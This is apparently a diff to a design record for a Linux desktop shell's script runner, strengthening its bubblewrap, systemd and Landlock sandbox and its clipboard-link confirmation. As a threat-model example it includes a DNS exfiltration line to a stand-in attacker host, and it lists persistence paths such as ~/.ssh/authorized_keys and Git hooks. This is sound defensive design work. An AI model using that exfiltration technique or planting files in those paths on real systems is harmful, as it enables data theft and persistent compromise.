@@ -132,7 +132,8 @@ Folders are watched; a changed file is re-read.
 
 **Approval (macOS model: the first-open prompt for code from elsewhere), enforced on every path.**
 - The first run of a script, and the first run after its content changes, asks: "Run “<title>”? It is a script from
-  <folder>." with the script's confinement level shown (Cancel, Run).
+  <folder>. It can change your documents, and a changed file, for example in a code project, can run later with your
+  rights." with the script's confinement level shown (Cancel, Run).
 - An approval is `{path, SHA-256, allowNetwork, allowSession}` in `$XDG_STATE_HOME/grassfield/script-approvals.json` (0600).
   A changed hash drops the approval **and** both permissions.
 - **No path runs an unapproved or changed script:** a row's Return, a quick key, a keyboard shortcut and `qs ipc call search
@@ -141,9 +142,10 @@ Folders are watched; a changed file is re-read.
 - **`needsConfirmation` is never skipped:** every origin shows its confirmation in Search before the run; an inline script that
   needs confirmation is never refreshed automatically (its subtitle reads "Run to update").
 - **The runner checks too.** `grassfield-script-run` reads the approvals file itself (it does not trust the shell's word),
-  copies the script into a private run folder (`$XDG_RUNTIME_DIR/grassfield/script-run/<random>/`, 0700), hashes **the copy**,
-  refuses when that hash is not the approved one, and runs the copy, bound read-only at the script's original path inside the
-  sandbox. A file swapped after the check therefore never runs, and `$0` and sibling files keep working.
+  reads the script **once into memory** (it is at most 256 KiB), hashes those bytes, refuses when the hash is not the approved
+  one, and hands **the same bytes** to the sandbox (step 3 below: they travel in the framed message, and `bwrap --perms 0555
+  --ro-bind-data <memfd> <the script's path>` places them at the script's own path). There is no run folder and no second read
+  of the file, so a file swapped after the check never runs, and `$0` and sibling files keep working.
 - Approvals are never exported or imported (D-8). Forget Approval is an action.
 
 **Process model.** The shell never runs a script in its own process tree. It runs `grassfield-script-run` (Python stdlib,
@@ -152,46 +154,81 @@ Folders are watched; a changed file is re-read.
 2. starts `systemd-run --user --wait --pipe --collect --quiet --description="Grassfield script"` (a **fixed** description; the
    unit's command line holds only fixed arguments and the script's path) with `RuntimeMaxSec` (60 s; 10 s for inline),
    `MemoryMax=512M`, `TasksMax=64`, `NoNewPrivileges=yes`: its own cgroup, limits, and a whole-tree kill on timeout;
-3. inside the unit, runs `bwrap` with the profile of the script's level (below), then the runner's own exec stage
-   (`grassfield-script-run --exec`), which reads one framed message on stdin (the arguments and the password values), execs the
-   script with the non-secret arguments as `$1..$3` and gives it the password values on **its stdin**, one per line in
-   argument order (the password's `$n` is the empty string). Arguments therefore never appear in the unit's properties or the
-   journal, and secrets never appear in any argv: `/proc/<pid>/cmdline` is readable by every local user. This is the one
-   difference from Raycast's `$n` for passwords, and the spec documents it;
+3. writes one framed message on the unit's stdin (`--pipe`): the script's bytes and their hash, the non-secret arguments and the
+   password values. Inside the unit, the runner's sandbox stage (`grassfield-script-run --sandbox`) reads it, hashes the bytes
+   again and refuses a mismatch, puts them in a sealed memfd, and execs `bwrap` with the profile of the script's level (below)
+   and `--ro-bind-data` from that memfd; it hands the arguments and passwords to the next stage on an inherited pipe (no file
+   descriptor crosses `systemd-run`, only its stdin). Inside `bwrap`, the exec stage (`grassfield-script-run --exec`) applies
+   the Landlock scopes of the level (below), reads the arguments, and execs the script with the non-secret arguments as
+   `$1..$3`, giving it the password values on **its stdin**, one per line in argument order (the password's `$n` is the empty
+   string). Arguments therefore never appear in the unit's properties or the journal, and secrets never appear in any argv:
+   `/proc/<pid>/cmdline` is readable by every local user. This is the one difference from Raycast's `$n` for passwords, and
+   the spec documents it;
 4. caps stdout at 1 MiB and 2 000 lines and stderr at 64 KiB, then kills the run; exit 0 is success, any other is a failure
    whose last output line is the message ([R16]).
 The shell kills every running script when the session locks (`systemctl --user kill` on the unit, by its recorded name), and
 inline refreshes run only while Search is open, at most five scripts.
 
-**Confinement levels (integrator decision, delegated, so that Q-2's answer is a real barrier).**
+**Confinement levels (integrator decision, delegated, so that Q-2's answer is a real barrier).** A network namespace cuts
+TCP and abstract sockets, but **not file sockets**: on this machine `/etc/resolv.conf` is a link to
+`/run/systemd/resolve/stub-resolv.conf` (nameserver 127.0.0.53) and nsswitch's `hosts:` line is `mymachines mdns_minimal
+[NOTFOUND=return] resolve files myhostname dns`, so `getent hosts <data>.attacker.tld` through
+`/run/systemd/resolve/io.systemd.Resolve` would leak data by DNS from inside a network namespace. `/run` also holds the system
+bus (`/run/dbus/system_bus_socket`: NetworkManager, resolve1), CUPS (`/run/cups/cups.sock`), Avahi
+(`/run/avahi-daemon/socket`) and Docker (`/run/docker.sock`, root for a member of the docker group), all mode 0666 or
+group-accessible (read-only checks, 2026-11-23). So the levels hide **all of `/run`**, not only the runtime directory.
 
 | | **Confined** (default) | **Allow network** (per script, off by default) | **Allow access to my session** (per script, off by default) |
 |---|---|---|---|
-| Network | new network namespace: loopback of its own only; no internet, no host localhost services, **no abstract Unix sockets** | the host's network namespace: internet, host localhost services (Ollama, CUPS…), and **abstract Unix sockets** (an Xwayland abstract X11 socket among them) | host network only if Allow network is also on; but see the row below |
-| `$XDG_RUNTIME_DIR` (session bus, Wayland and Hyprland sockets, PipeWire, keyring, systemd user manager, Grassfield's runtime files) | a tmpfs over `/run/user/<uid>`; `DBUS_SESSION_BUS_ADDRESS`, `WAYLAND_DISPLAY`, `DISPLAY`, `HYPRLAND_INSTANCE_SIGNATURE` unset | same as Confined | bound, with those variables set, **except** `$XDG_RUNTIME_DIR/grassfield` (still hidden) |
-| X11 | private `/tmp`: no `/tmp/.X11-unix`; abstract socket blocked by the network namespace | the abstract X11 socket is reachable (residual, tested) | `/tmp/.X11-unix` bound |
+| Network | new network namespace: a loopback of its own; no internet, no host localhost services | the host's network namespace: internet and the host's localhost TCP services (Ollama, CUPS on 631…) | the host's network, whatever the other switch says (the session can reach it anyway) |
+| `/run` (system bus, resolved, CUPS, Avahi, Docker, machined, the runtime directory) | a tmpfs over all of `/run`, with an empty `/run/user/<uid>` (0700) as `XDG_RUNTIME_DIR`; `DBUS_SESSION_BUS_ADDRESS`, `DBUS_SYSTEM_BUS_ADDRESS`, `WAYLAND_DISPLAY`, `DISPLAY`, `HYPRLAND_INSTANCE_SIGNATURE` unset | the same tmpfs, plus **only `/run/systemd/resolve` bound back read-only**, so names resolve | `/run` bound, with those variables set, **except** `$XDG_RUNTIME_DIR/grassfield` (still hidden); this includes the system bus and, for a docker-group member, Docker |
+| DNS | none: `/etc/resolv.conf` dangles, nss `resolve` finds no socket, `mdns_minimal` finds no Avahi, `mymachines` no machined; only `/etc/hosts` and `myhostname` answer | systemd-resolved, through its varlink socket (nss `resolve`) and its stub 127.0.0.53 (nss `dns`); mDNS stays off (no Avahi socket) | the host's |
+| Abstract Unix sockets (an Xwayland X11 socket, D-Bus abstract addresses) | refused twice: the network namespace and **Landlock `LANDLOCK_SCOPE_ABSTRACT_UNIX_SOCKET`** | refused by **Landlock `LANDLOCK_SCOPE_ABSTRACT_UNIX_SOCKET`** | allowed |
+| Signals to processes outside the sandbox | refused (new PID namespace and **Landlock `LANDLOCK_SCOPE_SIGNAL`**) | same | the PID namespace only |
+| X11 file sockets | private `/tmp`: no `/tmp/.X11-unix` | same | `/tmp/.X11-unix` bound |
 | Clipboard (ext-data-control), screen, input | unreachable (no Wayland socket) | unreachable | reachable: the script can read the clipboard, start apps, drive Hyprland |
 | systemd user manager (`systemd-run --user`, `systemctl --user`) | unreachable | unreachable | **reachable: the script can start processes outside every barrier** |
-| Files | `/` read-only; the home writable **except** every hidden entry directly under it (`~/.config`, `~/.local`, `~/.bashrc`…), which is read-only, so no autostart, shell rc, unit or compositor config can be planted; hidden: `$XDG_STATE_HOME/grassfield`, `$XDG_CONFIG_HOME/grassfield`, `~/.local/share/keyrings` | same as Confined; note that whatever the script can read it can now send | same as Confined |
-| Processes | new PID, IPC and UTS namespaces, `--die-with-parent`, `--new-session` (no TIOCSTI), the systemd limits | same | same |
+| Files | `/` read-only. **The home is mounted read-only, then each visible top-level entry (`~/Documents`, `~/Projects`, `~/notes.txt`…) is bound writable.** Hidden entries (`~/.config`, `~/.local`, `~/.ssh`…) stay read-only, and so do absent ones: the home itself is read-only, so no new top-level entry (`~/.zshenv`, `~/.bash_login`, `~/.xprofile`, a new folder) can be created, and nothing can be added under a hidden entry (`~/.ssh/authorized_keys`). A visible entry that is a link is bound only when its target is not inside a hidden entry or the home's root; otherwise it stays read-only. A top-level entry created by another program during the run stays read-only for that run. **Every script folder is mounted read-only** after the writable binds. Hidden: `$XDG_STATE_HOME/grassfield`, `$XDG_CONFIG_HOME/grassfield`, `~/.local/share/keyrings`, and known socket files in the home (`~/.gnupg/S.*`, `~/.ssh/*.sock`), masked with `/dev/null` | same as Confined; whatever the script can read it can now send | same as Confined |
+| Processes | new PID, IPC and UTS namespaces, `--die-with-parent`, `--new-session` (no TIOCSTI), `NoNewPrivileges`, the systemd limits | same | same, without the Landlock scopes |
 | How its effects reach the session | only through the palette: output shown in Search, Copy (the palette copies), Paste (ADR-0034's targeted paste), a notification or HUD the shell posts for `silent` and `compact` | same | also directly |
 
-- **Allow network** lifts only the network namespace. Its switch (in the script's Actions and its approval prompt) reads:
-  "Allow network: this script can send anything it can read to the internet."
-- **Allow access to my session** lifts the runtime-directory, Wayland, X11 and bus barriers. Its switch carries a plain
-  warning: "This script will be able to read your clipboard, control your windows and start other programs, including
+**Landlock** (kernel LSM; this machine's kernel 7.2.15 reports ABI 10 and lists `landlock` in `/sys/kernel/security/lsm`; the
+scopes need ABI ≥ 6). The runner's exec stage calls `landlock_create_ruleset` with `scoped =
+LANDLOCK_SCOPE_ABSTRACT_UNIX_SOCKET | LANDLOCK_SCOPE_SIGNAL` and `landlock_restrict_self` through Python `ctypes` (no new
+dependency), after `no_new_privs`, before it execs the script, at every level except Allow access to my session. If the ABI is
+below 6, Landlock is absent, or a call fails, the script **does not run** at those levels (fail closed); the row says "This
+computer cannot confine scripts" and the journal says why.
+
+**Switches.**
+- **Allow network** lifts only the network namespace and binds `/run/systemd/resolve` back. Its switch (in the script's Actions
+  and its approval prompt) reads: "Allow network: this script can send anything it can read to the internet." Abstract
+  sockets and every other `/run` socket stay closed.
+- **Allow access to my session** lifts the `/run`, runtime-directory, Wayland, X11, bus and Landlock barriers. Its switch carries
+  a plain warning: "This script will be able to read your clipboard, control your windows and start other programs, including
   programs that reach the network. Turn this on only for a script you wrote or fully trust." It is equivalent to running the
   script without confinement, apart from the files rule and the limits.
 - Both are off by default, remembered with the approval, reset when the hash changes, and shown on the row (a small glyph).
-- The X3 slices test the matrix for real: a probe script tries `curl` to a host loopback listener and to an outside address,
-  `dbus-send --session`, `hyprctl version`, `systemd-run --user true`, `wl-paste`, writing `~/.bashrc`, reading
-  `$XDG_STATE_HOME/grassfield/search-usage.json` and an X11 connection, under each level, and each result must equal the table.
-  If `systemd-run` or `bwrap` refuses a property, the runner **fails closed** (the script does not run) and says which.
 
-Residual risks (documented, opus review): in every level a script can read and change the user's visible files, by design
-(that is what scripts are for); with Allow network it can send them; with Allow access to my session it has the user's full
-rights. Abstract Unix sockets come with the network namespace, so Allow network also exposes them (tested, named in the
-switch's help).
+**Tested for real** (slice X3c): a probe script tries, under each level, `curl` to a host loopback listener and to an outside
+address, `getent hosts` of a name only resolved can answer (through nss `resolve` and through 127.0.0.53), `dbus-send
+--session` and `dbus-send --system`, `lpstat -r` (the CUPS socket), the presence of `/run/docker.sock` and
+`/run/avahi-daemon/socket`, a connection to an Xwayland abstract socket (`@/tmp/.X11-unix/X<n>`, from a test X server when
+none runs), `hyprctl version`, `systemd-run --user true`, `wl-paste`, `kill -0` of a process outside, creating `~/.zshenv` and
+`~/.ssh/authorized_keys`, writing into a script folder, writing into a visible folder (allowed), reading
+`$XDG_STATE_HOME/grassfield/search-usage.json`, and a walk of every socket file it can see (`find / -type s`, which must find
+none outside its own `/run/user/<uid>` at the first two levels). Each result must equal the table. If `systemd-run`, `bwrap` or
+Landlock refuses a property, the runner **fails closed** and says which.
+
+**Residual risks** (documented, opus review, and said in the approval prompt):
+- In every level a script can read and change the files in the visible top-level entries, by design (that is what scripts are
+  for). A file it leaves there can **run later with the user's rights** when another program trusts it: Git hooks in a
+  project's `.git/hooks`, a direnv `.envrc`, a Makefile or build script, an editor's task or launch file, a desktop launcher
+  in `~/Desktop`. The approval prompt says so in plain words (above). Read-only would make scripts useless; per-folder grants
+  are a later refinement, not planned now.
+- With Allow network a script can send whatever it can read (the whole home, `~/.ssh` included, read-only).
+- With Allow access to my session it has the user's full rights.
+- A socket file another program creates in a visible folder during a run is reachable (a read-only mount does not stop
+  `connect()`); the X3c socket walk catches the known kinds.
 
 ### D-4. The local model (D-net)
 **Detection.** `LocalModel.qml` asks `http://127.0.0.1:11434/api/version` and `/api/tags` (then `[::1]`) when Search opens,
@@ -269,12 +306,21 @@ Everything else is refused at creation and at open: `javascript:`, `data:`, `blo
 (`x-scheme-handler/*` could pass arguments to any app), and network file schemes (`smb:`, `sftp:`, `ftp:`, `dav:`…) whose
 opening reaches the network through Files or KIO without the browser's visible address bar.
 
-**A link that would send the clipboard.** An http(s) or mailto target containing `{clipboard}` (or, later, `{selection}`)
-could carry the clipboard to a web site in the URL. Such a link does not open directly: Return first shows the **expanded
-target** in the detail pane ("This link will open: https://…"), and a second Return opens it. Chosen over forbidding the
-placeholder because it keeps a real use (a dictionary or translation site on the copied word) while the person sees exactly
-what leaves, the same "show before send" rule as the local model (D-4); macOS has no quicklinks, and its nearest model is the
-browser's visible address bar. Local paths and applications never take `{clipboard}` in a path.
+**A link that would send data the person did not type.** An http(s) or mailto target could carry the clipboard to a web
+site in its URL. The rule is decided on the **resolved value**, not on the template:
+- `Placeholders.js` records where every substituted piece came from. A piece that comes from the clipboard or the selection,
+  directly or through a `{snippet}` whose text contains `{clipboard}` (resolved recursively, at most 3 levels), marks the link
+  as **carrying data**. Values the person typed in this run (`{argument}`) and generated values (`{date}`, `{time}`,
+  `{datetime}`, `{day}`, `{uuid}`) do not.
+- A link carrying data never opens directly, **from any origin** (a row, a quick key, a keyboard shortcut, `qs ipc call
+  search run`): Search opens on the detail pane, which shows "This link will open:" and the **full URL, percent-encoded, never
+  elided** (wrapped over as many lines as it needs).
+- A URL longer than 2 048 characters is refused with a message, so the pane can always show it whole.
+- The second Return opens **exactly the string shown**, kept from the first step; nothing is resolved again (the clipboard may
+  have changed meanwhile).
+Chosen over forbidding the placeholder because it keeps a real use (a dictionary or translation site on the copied word)
+while the person sees exactly what leaves, the same "show before send" rule as the local model (D-4); macOS has no quicklinks,
+and its nearest model is the browser's visible address bar. Local paths and applications never take `{clipboard}` in a path.
 
 Grassfield ships no web link and no web-search fallback (D-net).
 
@@ -313,6 +359,7 @@ excluded (D-net).
 |---|---|---|
 | Script limits and cleanup | systemd-run (systemd) | present on every target system |
 | Script namespaces | bubblewrap | grassfield-desktop `depends` already |
+| Abstract-socket and signal scopes | Landlock (kernel), called through Python `ctypes` in the runner | the running kernel (ABI ≥ 6; this machine: 10); no package |
 | Script icons | `shell/services/image-copy.py` (rsvg-convert) | already |
 | Pick Color | hyprpicker | Omarchy base; looked up at use time |
 | Paste, copy, restore | wl-clipboard, the clipboard helper | already (the helper gains the "what owns the selection" answer, D-5) |
@@ -339,11 +386,14 @@ scripts. The compositor plugin is not changed by this plan.
 - **DA-6** Not planned, with reasons in the spec matrix: currency, web search and dictionary (D-net or a new dependency);
   calendar and reminders (no data store); app and site blocking; skin-tone emoji; extensions and store (D-ext); Hyper key.
 - **DA-7** French UI wording follows Apple's French guides where they exist (Quick Keys' French name is checked in P5).
-- **DA-8** Confinement levels (D-3): confined by default with no network, no session bus, no Wayland or X11, no runtime
-  directory and read-only hidden home entries; Allow network lifts only the network namespace; Allow access to my session is
-  a separate, warned switch. This makes the owner's Q-2 answer hold against a script, not only against Grassfield.
-- **DA-9** Links with `{clipboard}` show their expanded target before opening (D-7); the link allowlist excludes custom
-  scheme handlers and network file schemes.
+- **DA-8** Confinement levels (D-3): confined by default with no network, all of `/run` hidden (no system or session bus, no
+  resolved, CUPS, Avahi or Docker), no Wayland or X11, Landlock scopes on abstract sockets and signals, a read-only home with
+  only its visible top-level entries writable and the script folders read-only; Allow network lifts only the network
+  namespace and binds resolved back; Allow access to my session is a separate, warned switch. This makes the owner's Q-2
+  answer hold against a script, not only against Grassfield.
+- **DA-9** A link whose resolved URL carries clipboard or selection data shows the full URL before opening, from every
+  origin, and opens exactly what it showed (D-7); the link allowlist excludes custom scheme handlers and network file
+  schemes.
 - **DA-10** The shell is the one writer of `commands.json` and `commands-keys.lua` (D-8).
 - **DA-11** Password arguments reach a script on stdin, never in argv (D-3).
 
@@ -370,7 +420,9 @@ scripts. The compositor plugin is not changed by this plan.
 - **No bridge or a T0 app:** no menu-item rows.
 - **systemd-run or bwrap refuses a property:** the script does not run; its row says "This script could not be started" and the
   journal says which property.
-- **The approved hash does not match the runner's copy:** not run; Search asks for approval again.
+- **The approved hash does not match the bytes the runner read:** not run; Search asks for approval again.
+- **Landlock below ABI 6, absent or refused:** no script runs at the Confined and Allow network levels ("This computer cannot
+  confine scripts").
 - **A script hangs:** killed at its limit; the row shows the failure.
 - **Ollama absent, slow, or listening under another user's uid:** no AI rows; a running request times out after 60 s with a
   message; Stop aborts.
@@ -383,7 +435,7 @@ Per slice, in docs/specs/command-palette.md §4: L0 (pure JS, helper fakes), uni
 with a screenshot path or "visual NOT verified", L2 for the owner. Opus security reviews: spec §4.4.
 
 ## Consequences
-- 70 slices of at most a day across eight lanes (spec §4.1); the first owner-visible result (Actions on every row, the system
+- 71 slices of at most a day across eight lanes (spec §4.1); the first owner-visible result (Actions on every row, the system
   and window commands, the main toggles) needs eight of them: P1, P2, P3a, P3b, P3c, S1, S3 and S6.
 - New code stays in existing directories: `shell/search/`, `shell/platform/`, `apps/settings/`, `apps/clipboard-helper/` (the
   selection-owner answer), `ui/Grassfield/`, `config/hypr/grassfield/` (`commands.lua`), plus
